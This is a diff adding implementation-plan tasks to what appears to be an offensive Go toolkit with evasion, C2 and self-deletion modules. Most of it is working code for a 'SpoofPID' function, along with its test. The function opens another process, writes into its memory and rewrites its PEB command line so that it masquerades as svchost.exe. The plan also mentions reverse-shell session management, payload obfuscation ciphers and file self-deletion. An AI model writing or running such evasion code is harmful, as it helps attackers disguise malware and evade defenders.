+    t.Cleanup(func() { proc.Process.Kill() })
+
+    pid := uint32(proc.Process.Pid)
+    fake := `C:\Windows\System32\svchost.exe -k netsvcs`
+
+    if err := SpoofPID(pid, fake, nil); err != nil {
+        t.Fatalf("SpoofPID: %v", err)
+    }
+
+    // Verify by querying the remote PEB from the test process.
+    // (Implementation reads CommandLine from target PEB and compares.)
+    got, err := readRemoteCmdLine(pid)
+    if err != nil {
+        t.Fatalf("readRemoteCmdLine: %v", err)
+    }
+    if got != fake {
+        t.Errorf("cmdline = %q, want %q", got, fake)
+    }
+}
+```
+
+- [ ] **Step 2: Implement SpoofPID in fakecmd_windows.go**
+
+```go
+// SpoofPID overwrites the PEB CommandLine UNICODE_STRING of process pid.
+// Requires PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION on target.
+// There is no corresponding RestorePID — call SpoofPID again with the original string
+// if restoration is needed. The caller is responsible for tracking the original.
+//
+// caller may be nil (falls back to direct NtAllocateVirtualMemory via api proc).
+func SpoofPID(pid uint32, fakeCmd string, caller *wsyscall.Caller) error {
+    const access = windows.PROCESS_VM_READ | windows.PROCESS_VM_WRITE |
+        windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION
+
+    handle, err := windows.OpenProcess(access, false, pid)
+    if err != nil {
+        return fmt.Errorf("fakecmd: OpenProcess(%d): %w", pid, err)
+    }
+    defer windows.CloseHandle(handle)
+
+    // 1. Get remote PEB address via NtQueryInformationProcess.
+    var pbi processBasicInformation
+    var retLen uint32
+    if caller != nil {
+        _, err = caller.Call("NtQueryInformationProcess",
+            uintptr(handle), 0,
+            uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi),
+            uintptr(unsafe.Pointer(&retLen)),
+        )
+    } else {
+        _, _, err = api.ProcNtQueryInformationProcess.Call(
+            uintptr(handle), 0,
+            uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi),
+            uintptr(unsafe.Pointer(&retLen)),
+        )
+    }
+    if err != nil && err != windows.ERROR_SUCCESS {
+        return fmt.Errorf("fakecmd: NtQueryInformationProcess: %w", err)
+    }
+
+    // 2. Read ProcessParameters pointer from remote PEB (offset 0x20 on x64).
+    var ppAddr uintptr
+    if err := readRemotePtr(handle, pbi.PebBaseAddress+0x20, &ppAddr); err != nil {
+        return fmt.Errorf("fakecmd: read ProcessParameters ptr: %w", err)
+    }
+
+    // 3. Read UNICODE_STRING CommandLine from ProcessParameters (offset 0x70 on x64).
+    var cmdLine unicodeString
+    if err := readRemoteStruct(handle, ppAddr+0x70,
+        unsafe.Pointer(&cmdLine), unsafe.Sizeof(cmdLine)); err != nil {
+        return fmt.Errorf("fakecmd: read CommandLine: %w", err)
+    }
+
+    // 4. Allocate space in target process for the new UTF-16 string.
+    fakeUTF16, err := windows.UTF16FromString(fakeCmd)
+    if err != nil {
+        return fmt.Errorf("fakecmd: UTF16FromString: %w", err)
+    }
+    byteLen := uintptr(len(fakeUTF16) * 2)
+
+    var remoteAddr uintptr
+    size := byteLen
+    ntAlloc := api.Ntdll.NewProc("NtAllocateVirtualMemory")
+    r, _, _ := ntAlloc.Call(
+        uintptr(handle),
+        uintptr(unsafe.Pointer(&remoteAddr)),
+        0,
+        uintptr(unsafe.Pointer(&size)),
+        windows.MEM_COMMIT|windows.MEM_RESERVE,
+        windows.PAGE_READWRITE,
+    )
+    if r != 0 {
+        return fmt.Errorf("fakecmd: NtAllocateVirtualMemory in target: NTSTATUS 0x%X", r)
+    }
+
+    // 5. Write the fake string into target.
+    fakeBytes := unsafe.Slice((*byte)(unsafe.Pointer(&fakeUTF16[0])), byteLen)
+    if err := windows.WriteProcessMemory(handle, remoteAddr,
+        &fakeBytes[0], byteLen, nil); err != nil {
+        return fmt.Errorf("fakecmd: WriteProcessMemory (string): %w", err)
+    }
+
+    // 6. Patch UNICODE_STRING in target PEB.
+    newLen    := uint16((len(fakeUTF16) - 1) * 2) // exclude null terminator
+    newMaxLen := uint16(len(fakeUTF16) * 2)
+    cmdLineAddr := ppAddr + 0x70
+
+    writeU16 := func(off uintptr, v uint16) error {
+        return windows.WriteProcessMemory(handle, cmdLineAddr+off,
+            (*byte)(unsafe.Pointer(&v)), 2, nil)
+    }
+    if err := writeU16(0, newLen); err != nil {
+        return fmt.Errorf("fakecmd: patch Length: %w", err)
+    }
+    if err := writeU16(2, newMaxLen); err != nil {
+        return fmt.Errorf("fakecmd: patch MaximumLength: %w", err)
+    }
+    if err := windows.WriteProcessMemory(handle, cmdLineAddr+8,
+        (*byte)(unsafe.Pointer(&remoteAddr)), unsafe.Sizeof(remoteAddr), nil); err != nil {
+        return fmt.Errorf("fakecmd: patch Buffer: %w", err)
+    }
+
+    return nil
+}
+
+// readRemotePtr reads a uintptr-sized value from addr in the remote process.
+func readRemotePtr(proc windows.Handle, addr uintptr, out *uintptr) error {
+    return windows.ReadProcessMemory(proc, addr,
+        (*byte)(unsafe.Pointer(out)), unsafe.Sizeof(*out), nil)
+}
+
+// readRemoteStruct reads size bytes from addr in the remote process into dst.
+func readRemoteStruct(proc windows.Handle, addr uintptr, dst unsafe.Pointer, size uintptr) error {
+    return windows.ReadProcessMemory(proc, addr, (*byte)(dst), size, nil)
+}
+```
+
+- [ ] **Step 3: Update fakecmd.md — add Remote Spoofing section**
+
+- [ ] **Step 4: Build, test, commit**
+
+```
+go build $(go list ./...)
+go test ./evasion/fakecmd/... -run TestSpoofPID -v
+git add evasion/fakecmd/ docs/techniques/evasion/fakecmd.md
+git commit -m "feat(fakecmd): SpoofPID — remote process PEB CommandLine overwrite"
+```
+
+---
+
+## Task 14: `encode` Markdown Documentation + `selfdelete` ADS Comment
+
+**Spec ref:** Sprint 2 Extensions design § D & E
+
+**Files:**
+- Create: `docs/techniques/encode/README.md`
+- Modify: `cleanup/selfdelete/selfdelete_windows.go` (comment only)
+
+- [ ] **Step 1: Create docs/techniques/encode/README.md**
+
+Create a complete technique page covering:
+- Purpose and when to use encode vs crypto  
+- All functions: Base64, Base64URL, ROT13, UTF16LE, PowerShell
+- Full API reference
+- Integration example (encode after crypto: encrypt → Base64-encode for embedding in source)
+
+- [ ] **Step 2: Add explanatory comment to selfdelete_windows.go**
+
+After the imports, add:
+
+```go
+// Note on ADS package: cleanup/selfdelete intentionally does not use system/ads.
+// system/ads operates on named streams via CreateFile("path:streamname") — a high-level
+// approach for reading/writing ADS content. selfdelete.Run() instead renames the DEFAULT
+// stream (:$DATA) to a throwaway name using SetFileInformationByHandle + FILE_RENAME_INFO,
+// which is a lower-level operation with no equivalent in system/ads. The two packages are
+// complementary, not redundant.
+```
+
+- [ ] **Step 3: Build and commit**
+
+```
+go build $(go list ./...)
+git add docs/techniques/encode/ cleanup/selfdelete/selfdelete_windows.go
+git commit -m "docs: encode package page + clarify ADS/selfdelete relationship"
+```
+
+---
+
+## Self-Review (Extensions)
+
+**Spec coverage:**
+- ✅ A. c2/multicat → Task 10 (Listener) + Task 11 (Manager)
+- ✅ B. crypto additions → Task 12
+- ✅ C. fakecmd remote → Task 13
+- ✅ D. ADS/selfdelete → Task 14
+- ✅ E. encode docs → Task 14
+
+**Type consistency check:**
+- `transport.Listener` interface mirrors `transport.Transport` — symmetric design ✅
+- `multicat.Manager` channels are `chan Event` (buffered 64) — consistent with project pattern ✅  
+- `crypto.EncryptTEA/DecryptTEA(key [16]byte, data []byte) ([]byte, error)` — same signature style as AES ✅
+- `crypto.MatrixTransform(data []byte, key [][]byte) ([]byte, error)` — consistent error handling ✅
+- `fakecmd.SpoofPID(pid uint32, fakeCmd string, caller *wsyscall.Caller) error` — matches Spoof signature style ✅
+
+**Notes for implementer:**
+1. TEA/XTEA `teaDelta` constant is shared — define in `tea.go` only; `xtea.go` imports nothing from `tea.go` (same package, so no import needed but use a named constant, not a magic number).
+2. `MatrixTransform` uses Hill cipher arithmetic (no Galois field), which works perfectly mod 256 for obfuscation. Not equivalent to AES S-boxes — intentional.
+3. `SpoofPID` offset `0x20` (ProcessParameters) and `0x70` (CommandLine) are x64-only. Add a `//go:build amd64` guard or verify offsets for arm64 if that becomes a target.
+4. The multicat `handle` goroutine's drain-loop reads 1 byte at a time only to detect EOF. For real shell interaction, the caller uses `sess.Read`/`sess.Write` directly — no buffering needed in Manager.
+
+---
+
 ## Self-Review
 
 **Spec coverage:**
